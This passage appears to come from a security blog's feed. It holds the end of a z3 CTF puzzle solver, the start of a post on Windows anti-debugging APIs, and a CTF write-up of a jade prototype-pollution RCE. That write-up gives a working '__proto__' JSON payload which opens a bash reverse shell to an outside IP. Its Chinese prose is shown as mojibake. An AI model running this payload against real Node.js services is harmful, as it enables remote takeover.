class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>puzzle = <span class="hljs-string">&quot;&quot;&quot;â—â—‹â—‹â—‹â—‹â—‹â—‹â—‹â—</span><br><span class="hljs-string">â—â—â—‹â—â—‹â—‹â—‹â—‹â—</span><br><span class="hljs-string">â—‹â—‹â—â—‹â—â—‹â—â—‹â—</span><br><span class="hljs-string">â—â—â—â—‹â—‹â—‹â—‹â—â—‹</span><br><span class="hljs-string">â—â—â—â—‹â—‹â—â—‹â—â—</span><br><span class="hljs-string">â—‹â—â—‹â—‹â—â—‹â—‹â—â—</span><br><span class="hljs-string">â—‹â—â—‹â—‹â—‹â—‹â—‹â—‹â—</span><br><span class="hljs-string">â—â—â—â—â—â—‹â—â—â—</span><br><span class="hljs-string">â—â—‹â—‹â—‹â—â—â—‹â—‹â—&quot;&quot;&quot;</span><br>puzzle = puzzle.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>state = [[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">if</span> puzzle[i][j] == <span class="hljs-string">&#x27;â—‹&#x27;</span>:<br>            state[i][j] = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            state[i][j] = <span class="hljs-number">0</span><br><br>switches = [[BitVec(<span class="hljs-string">&quot;s_%d_%d&quot;</span> % (i, j), <span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)]<br>s = Solver()<br><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        t = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> switches[row][:]:<br>            t ^= p<br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> switches[:][col]:<br>            t ^= p<br>        t ^= switches[row][col]<br>        s.add(t == state[row][col])<br><br>s_list = <span class="hljs-built_in">list</span>()<br><br>final = <span class="hljs-number">0</span><br>temp = <span class="hljs-number">9999999</span><br><br><span class="hljs-keyword">while</span> s.check() == sat:<br>    m = s.model()<br>    s.add(Or([switches[i][j] != m[switches[i][j]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]))<br><br>    summ = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> pp <span class="hljs-keyword">in</span> m:<br>        summ += m[pp].as_long()<br>    <span class="hljs-keyword">if</span> summ &lt; temp <span class="hljs-keyword">and</span> summ != <span class="hljs-number">0</span>:<br>        temp = summ<br>        final = m<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">24</span> &gt; summ &gt; <span class="hljs-number">0</span>:<br>        final = m<br>        <span class="hljs-built_in">print</span>(summ)<br>        <span class="hljs-keyword">break</span><br><br>index = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">if</span> final[switches[i][j]].as_long() == <span class="hljs-number">1</span>:<br>            index += <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;(&#123;&#125;,&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(i + <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>))<br><br><span class="hljs-built_in">print</span>(index)<br><span class="hljs-comment"># icq2f196f4f5398cc97a74d8b1032027</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>z3</category>
      
    </categories>
    
    
    <tags>
      
      <tag>z3</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jadeåŸå‹é“¾æ±¡æŸ“RCE</title>
    <link href="/2023/10/24/jade_prototype/"/>
    <url>/2023/10/24/jade_prototype/</url>
    
    <content type="html"><![CDATA[<p>é¢˜æºCTF SHOW Web342</p><span id="more"></span><h1 id="jadeåŸå‹é“¾æ±¡æŸ“RCE"><a href="#jadeåŸå‹é“¾æ±¡æŸ“RCE" class="headerlink" title="jadeåŸå‹é“¾æ±¡æŸ“RCE"></a>jadeåŸå‹é“¾æ±¡æŸ“RCE</h1><h2 id="1-åˆ†æ"><a href="#1-åˆ†æ" class="headerlink" title="1.åˆ†æ"></a>1.åˆ†æ</h2><p>ä¸‹è½½æºç ï¼Œæ‹–å…¥IDEAï¼Œåœ¨<code>bin/www.js</code>å¯åŠ¨è°ƒè¯•ï¼Œåœ¨<code>routes/index.js</code>ä¸‹æ–­ç‚¹ï¼Œç„¶åè®¿é—®<code>127.0.0.1:3000</code>ï¼Œè§¦å‘æ–­ç‚¹ï¼Œå¼€å§‹è°ƒè¯•</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2011.17.57.png"></p><p>è·Ÿå…¥<code>res.render</code>å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.41.35.png"></p><p>ç»§ç»­è·Ÿå…¥<code>app.render</code>å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.43.18.png"></p><p>ç»§ç»­è·Ÿå…¥<code>tryRender</code>å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.44.01.png"></p><p>ç»§ç»­è·Ÿå…¥<code>view.render</code>å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.44.35.png"></p><p>ç»§ç»­è·Ÿå…¥<code>this.engine</code>å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.46.15.png"></p><p>ç»§ç»­è·Ÿå…¥<code>exports.renderFile</code>å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.47.43.png"></p><p>èµ°ä¸€ä¸ªå°é€’å½’ï¼Œç„¶åè¿›å…¥<code>handleTemplateCache</code>å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.48.49.png"></p><p>è·Ÿè¿›<code>exports.compile</code>å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.56.47.png"></p><p>é‡ç‚¹å…³æ³¨204è¡Œçš„<code>parse</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°è¿”å›å€¼ç»™<code>parsed</code>ï¼Œç„¶å<code>parsed</code>æ‹¼æ¥è¿›<code>fn</code>ï¼Œ<code>fn</code>å†é€è¿›218è¡Œçš„<code>Function</code>æ‰§è¡Œï¼Œé‚£ä¹ˆå°±è¦æƒ³åŠæ³•è®©<code>parsed</code>ä»£å…¥æˆ‘ä»¬è‡ªå·±çš„å‘½ä»¤ï¼Œè·Ÿå…¥<code>parse</code>å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2013.00.12.png"></p><p>è¿™é‡Œå…ˆèµ°104è¡Œçš„<code>parse</code>å‡½æ•°ï¼Œå†èµ°114è¡Œçš„<code>compile</code>å‡½æ•°ï¼Œå¾—åˆ°çš„jsæ‹¼æ¥è¿›bodyç„¶åè¿”å›</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2013.01.23.png"></p><p>104è¡Œçš„<code>parse</code>å‡½æ•°æ“ä½œç©ºé—´ä¸å¤§ï¼Œè·Ÿè¿›114è¡Œçš„<code>compile</code>å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2013.03.35.png"></p><p>ç»§ç»­è·Ÿè¿›66è¡Œçš„<code>this.visit</code>å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2013.06.16.png"></p><p>å‘ç°æœ‰å¯æ§çš„åœ°æ–¹ï¼Œåªè¦èƒ½è¿›å…¥198è¡Œçš„è¯­å¥ï¼Œå°±å¯ä»¥æŠŠ<code>node.line</code>pushè¿›bufã€‚</p><p>å¯¹è¿™ä¸ª<code>this.debug</code>è¿›è¡Œæº¯æºè·Ÿè¸ªï¼ŒæŸ¥çœ‹æ˜¯å¦å¯æ§ï¼Œç¡®ä¿å…¶ä¸€å®šèƒ½è¿›å…¥<code>if</code>åˆ¤æ–­</p><p>åœ¨ç”±<code>this.engine</code>è¿›å…¥çš„å‡½æ•°é‡Œå‡ºç°ç›¸å…³å­—æ®µ</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2014.58.17.png"></p><p>ä¸”æ˜¯<code>undefined</code>ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æ±¡æŸ“ï¼Œç»§ç»­å¾€ä¸‹è·Ÿè¿›,çœ‹å“ªé‡Œèµ‹å€¼ç»™<code>this</code></p><p>æœ€ç»ˆå‘ç°æ˜¯åœ¨<code>index.js/parse()</code>å‡½æ•°é‡Œçš„111è¡Œï¼Œåˆ›å»ºäº†ä¸€ä¸ª<code>compile</code>å¯¹è±¡æ—¶ç»™çš„å€¼</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.04.45.png"></p><p>è·Ÿè¿›å»æŸ¥çœ‹</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.04.08.png"></p><p>æ­£å¥½ï¼Œè¿˜æ˜¯<code>undefined</code>ï¼Œè€Œä¸”èµ‹å€¼ä¹Ÿç®€å•ï¼Œå› æ­¤å¯ä»¥æ„é€ expç¡®ä¿<code>this.debug</code>ä¸ºtrue</p><p>è¿™é‡Œé¡ºå¸¦æŠŠ<code>line</code>ä¹Ÿä¸€èµ·æ±¡æŸ“äº†ï¼Œè¿™æ ·å¯ä»¥ä¿è¯åæœŸçš„payloadä¸€å®šèƒ½æ‰§è¡Œ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.106.95.62/3389 0&gt;&amp;1\&quot;&#x27;)&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>éšä¾¿æ‰¾ä¸€ä¸ªå¯¹è±¡ï¼ŒæŸ¥çœ‹å®ƒçš„åŸå‹ï¼Œçœ‹çœ‹æ˜¯å¦æ±¡æŸ“æˆåŠŸ</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.10.27.png"></p><p>å¯ä»¥å‘ç°ï¼Œ<code>object</code>ä»¥åŠå¸¦ä¸Šè¢«æ±¡æŸ“çš„å±æ€§äº†ï¼Œç»§ç»­å¾€ä¸‹èµ°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%25E9%258E%25B4%25EE%2581%2584%25E7%259D%25862023-10-24%252015.12.11.png"></p><p><code>node.line</code>ä¹Ÿå¦‚é¢„æœŸä¸€æ ·è¢«æ±¡æŸ“ï¼Œç»§ç»­æ‰§è¡Œ</p><p>æŠ¥é”™</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2014.50.51.png"></p><p>ä¾æ®æŠ¥é”™ä¿¡æ¯ï¼Œè¿›å…¥<code>compiler.js</code>çš„225è¡ŒæŸ¥çœ‹</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.20.02.png"></p><p>è°ƒè¯•å‘ç°ï¼Œå½“<code>node</code>ä¸ºåˆšåˆšæ±¡æŸ“çš„è¯­å¥æ—¶ï¼Œ<code>node.type</code>ä¸º<code>undefined</code>ï¼Œè¿›è€Œå¼•å‘æŠ¥é”™</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.23.06.png"></p><p>è€ƒè™‘ç»§ç»­æ±¡æŸ“<code>node.type</code>ï¼Œé‚£å°±ç›´æ¥æ±¡æŸ“æˆ<code>Block</code>å§ï¼Œè·Ÿä¸Šä¸€ä¸ªèŠ‚ç‚¹ä¸€æ ·</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Block&quot;</span>,<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.106.95.62/3389 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>ç»§ç»­æŠ¥é”™</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.49.36.png"></p><p>è·Ÿå…¥<code>compiler.js</code>çš„283è¡ŒæŸ¥çœ‹</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.51.23.png"></p><p>å°±æ˜¯283è¡Œé‚£å‡ å¥å‡ºé—®é¢˜ï¼Œé‚£å°±ç»§ç»­æ±¡æŸ“è¿™å‡ ä¸ªå˜é‡</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;nodes&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;length&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;escape&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;pp&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Block&quot;</span>,<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.106.95.62/3389 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>ç»§ç»­æŠ¥é”™</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.58.36.png"></p><p>å‰4ç‚¹ä¾æ—§å¤„äº<code>jade</code>æ¨¡å—ï¼Œåœ¨<code>jade</code>æ¨¡å—ä¸­ï¼Œæœ€ç»ˆæŠ¥é”™ç‚¹åœ¨<code>index.js</code>çš„149è¡Œ</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2015.58.42.png"></p><p>å°è¯•æ±¡æŸ“<code>options.self</code>ä¸ºtrueï¼Œè¿›è€Œé¿å…è¿›å…¥149è¡Œï¼Œçœ‹èƒ½ä¸èƒ½è§£å†³æ­¤é—®é¢˜</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;nodes&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;length&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;escape&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;pp&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Block&quot;</span>,<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.106.95.62/3389 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>Bingo!ï¼ŒæˆåŠŸå¼¹shell</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2016.02.25.png"></p><h2 id="2-exp"><a href="#2-exp" class="headerlink" title="2.exp"></a>2.exp</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;nodes&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;length&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;escape&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;pp&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Block&quot;</span>,<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.106.95.62/3389 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿæœ‰æ›´ç¨å¾®ç®€çŸ­çš„expï¼ˆä¹Ÿå°±æ˜¯æ¢äº†ä¸€ä¸ªBlockèŠ‚ç‚¹ï¼‰</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Code&quot;</span>ï¼Œ<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.106.95.62/3389 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>NOTEï¼šå¦‚æœPOSTçš„æ•°æ®æ²¡æœ‰æ¥æ”¶åˆ°ï¼Œçœ‹çœ‹HTTPå¤´æœ‰æ²¡æœ‰<code>Content-Type: application/json</code>ï¼Œæ²¡æœ‰çš„è¯åŠ ä¸€ä¸ªï¼ˆæœ¬åœ°åšçš„æ—¶å€™ï¼Œæ²¡æœ‰è¿™ä¸ªå­—æ®µï¼‰</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
      <category>prototype</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>prototype</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åè°ƒè¯•æŠ€æœ¯åˆæ¢</title>
    <link href="/2023/10/21/anti_base/"/>
    <url>/2023/10/21/anti_base/</url>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€äº›å¸¸ç”¨åŸºç¡€åè°ƒè¯•æŠ€æœ¯</p><span id="more"></span><h2 id="ä¸€ã€-APIçº§åˆ«"><a href="#ä¸€ã€-APIçº§åˆ«" class="headerlink" title="ä¸€ã€ APIçº§åˆ«"></a>ä¸€ã€ APIçº§åˆ«</h2><h3 id="1-IsDebuggerPresent"><a href="#1-IsDebuggerPresent" class="headerlink" title="1.IsDebuggerPresent"></a>1.IsDebuggerPresent</h3><p>IsDebuggerPresentæŸ¥è¯¢è¿›ç¨‹ç¯å¢ƒå—PEBä¸­çš„<code>IsDebugged</code>æ ‡å¿—ï¼Œå¦‚æœæ²¡æœ‰è¿è¡Œåœ¨è°ƒè¯•ç¯å¢ƒä¸­ï¼Œè¿”å›0ï¼Œå¦åˆ™è¿”å›ä¸€ä¸ªéé›¶å€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  &#123;  <br>    <span class="hljs-keyword">return</span> IsDebuggerPresent();  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-ChechRemoteDebuggerPresent"><a href="#2-ChechRemoteDebuggerPresent" class="headerlink" title="2.ChechRemoteDebuggerPresent"></a>2.ChechRemoteDebuggerPresent</h3><p>ä¸<code>IsDebuggerPresent</code>ä½¿ç”¨å‡ ä¹ä¸€è‡´ï¼Œå¯ä»¥æ¢æµ‹ç³»ç»Ÿå…¶ä»–è¿›ç¨‹æ˜¯å¦è¢«è°ƒè¯•ï¼Œé€šè¿‡ä¼ é€’è‡ªèº«è¿›ç¨‹å¥æŸ„è¿˜å¯ä»¥æ¢æµ‹è‡ªèº«æ˜¯å¦è¢«è°ƒè¯•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  &#123;  <br>    BOOL ret;  <br>    CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);  <br>    <span class="hljs-keyword">return</span> ret;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-NtQueryInformationProcess"><a href="#3-NtQueryInformationProcess" class="headerlink" title="3. NtQueryInformationProcess"></a>3. NtQueryInformationProcess</h3><p>å‡½æ•°åŸå‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">__kernel_entry NTSTATUS <span class="hljs-title function_">NtQueryInformationProcess</span><span class="hljs-params">(</span><br><span class="hljs-params">  [in]            HANDLE           ProcessHandle,</span><br><span class="hljs-params">  [in]            PROCESSINFOCLASS ProcessInformationClass,</span><br><span class="hljs-params">  [out]           PVOID            ProcessInformation,</span><br><span class="hljs-params">  [in]            ULONG            ProcessInformationLength,</span><br><span class="hljs-params">  [out, optional] PULONG           ReturnLength</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>å‚æ•°</p><blockquote><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[in]</span> ProcessHandle<br></code></pre></td></tr></table></figure><p>è¦ä¸ºå…¶æ£€ç´¢ä¿¡æ¯çš„è¿›ç¨‹å¥æŸ„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[in] ProcessInformationClass<br></code></pre></td></tr></table></figure><table><thead><tr><th>å€¼</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><strong>ProcessBasicInformation</strong><br />0</td><td>æ£€ç´¢æŒ‡å‘ PEB ç»“æ„çš„æŒ‡é’ˆï¼Œè¯¥ç»“æ„å¯ç”¨äºç¡®å®šæ˜¯å¦æ­£åœ¨è°ƒè¯•æŒ‡å®šçš„è¿›ç¨‹ï¼Œä»¥åŠç³»ç»Ÿç”¨äºæ ‡è¯†æŒ‡å®šè¿›ç¨‹çš„å”¯ä¸€å€¼ã€‚ä½¿ç”¨ <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/debugapi/nf-debugapi-checkremotedebuggerpresent">CheckRemoteDebuggerPresent</a> å’Œ <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/processthreadsapi/nf-processthreadsapi-getprocessid">GetProcessId</a> å‡½æ•°è·å–æ­¤ä¿¡æ¯ã€‚</td></tr><tr><td><strong>ProcessDebugPort</strong><br />7</td><td>æ£€ç´¢ä¸€ä¸ª <strong>DWORD_PTR</strong> å€¼ï¼Œè¯¥å€¼æ˜¯è¿›ç¨‹çš„è°ƒè¯•å™¨çš„ç«¯å£å·ã€‚ éé›¶å€¼æŒ‡ç¤ºè¿›ç¨‹æ­£åœ¨ç¯ 3 è°ƒè¯•å™¨çš„æ§åˆ¶ä¸‹è¿è¡Œã€‚</td></tr><tr><td><strong>ProcessDebugFlag</strong><br />0x1f</td><td>æ£€æµ‹æ˜¯å¦åœ¨è°ƒè¯•å™¨ç¯å¢ƒä¸‹è¿è¡Œï¼Œé›¶å€¼è¡¨ç¤ºæ­£åœ¨è¢«è°ƒè¯•</td></tr></tbody></table><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">[<span class="hljs-keyword">out</span>] ProcessInformation<br></code></pre></td></tr></table></figure><p>æŒ‡å‘è°ƒç”¨åº”ç”¨ç¨‹åºæä¾›çš„ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œå‡½æ•°å°†è¯·æ±‚çš„ä¿¡æ¯å†™å…¥å…¶ä¸­ã€‚ å†™å…¥çš„ä¿¡æ¯çš„å¤§å°å›  <em>ProcessInformationClass</em> å‚æ•°çš„æ•°æ®ç±»å‹è€Œå¼‚</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[in]</span> ProcessInformationLength<br></code></pre></td></tr></table></figure><p><em>ProcessInformation</em> 